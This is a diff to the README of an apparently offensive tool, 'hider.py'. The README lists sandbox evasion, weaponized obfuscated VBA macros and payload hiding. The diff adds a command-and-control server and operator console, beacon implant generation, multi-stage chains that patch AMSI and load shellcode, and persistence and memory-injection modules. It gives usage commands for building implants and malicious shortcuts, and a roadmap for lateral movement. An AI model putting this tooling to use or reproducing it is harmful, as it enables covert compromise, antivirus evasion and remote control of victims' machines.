@@ -24,6 +24,11 @@
 | **Evasion** | Sandbox Detection | JScript/VBScript wrappers checking RAM, CPU, domain |
 | **Evasion** | VBA Macros | Auto-generate weaponized, obfuscated VBA macros |
 | **Encryption** | AES-256 | Encrypt any payload with a password before hiding |
+| **C2 Server** | Flask + SQLite | Full-featured command & control listener and session tracking |
+| **C2 Console** | Interactive Shell | Manage implants, queue commands, and execute modules |
+| **Staging** | Automated Recipes | Generate multi-stage attack chains (AMSI patch + shellcode) |
+| **Implants** | Beacon Generator | Create custom Python/PowerShell beacons with sleep & jitter |
+| **Modules** | Plugin System | Hot-loadable post-exploitation modules (mem injection, persistence) |
 
 ---
 
@@ -49,7 +54,7 @@ pip install -r requirements.txt
 
 ## 🖥️ GUI Dashboard
 
-Launch the web-based interface for a point-and-click experience:
+Launch the web-based interface for a point-and-click experience and real-time **C2 Operator Console**:
 
 ```bash
 python3 app.py
@@ -150,6 +155,32 @@ python3 hider.py vba --payload "powershell -c Start-Process calc.exe" \
 ```bash
 python3 hider.py shortcut --cmd "powershell -WindowStyle Hidden -c calc" --out payload.lnk
 ```
+
+### Command & Control (C2)
+```bash
+# Start the C2 Listener (Flask + SQLite)
+python3 hider.py c2-server --port 8443
+
+# Launch the interactive Operator Console
+python3 hider.py c2-console
+
+# Generate a beacon implant (Python or PowerShell)
+python3 hider.py c2-beacon --url http://127.0.0.1:8443 --lang python --out beacon.py
+
+# Generate a multi-stage attack recipe
+python3 hider.py c2-stage --recipe windows_full --url "http://127.0.0.1:8443/beacon"
+```
+
+---
+
+## 🗺️ Roadmap
+
+The following features are currently in development:
+
+- [ ] **Encrypted C2 Channels:** Implementation of mTLS, custom encryption layers, and rotating keys.
+- [ ] **P2P Beacons:** SMB pivoting, named pipes, and mesh implant architectures.
+- [ ] **OpSec Protections:** Traffic shaping, domain rotation, and advanced sleep masking.
+- [ ] **Lateral Movement:** In-memory SMB, WMI, WinRM, and SSH pivoting modules.
 
 ---
 
